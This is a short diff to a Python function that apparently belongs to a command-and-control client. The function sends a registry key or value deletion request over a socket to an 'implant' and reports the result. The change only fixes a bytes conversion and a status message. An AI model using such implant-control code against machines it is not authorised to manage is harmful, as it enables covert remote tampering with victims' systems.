@@ -161,7 +161,7 @@ def regDelete(sock, isKey, keyPath, valueName):
 
         # Send whether or not we're deleting a key or value 
         print("Sending delete key... (%i)" % isKey)
-        sock.send(isKey + b'\x00')
+        sock.send(bytes(isKey) + b'\x00')
         time.sleep(WAIT_TIME)
 
         # Send key path to read
@@ -180,7 +180,7 @@ def regDelete(sock, isKey, keyPath, valueName):
         data = data.decode('utf-8')
 
         if (data == "SUCCESS"):
-            print("Successful reg read file! Getting key size...")
+            print("Successful reg delete!")
 
         else:
             print("Implant returned FAILURE!\n")
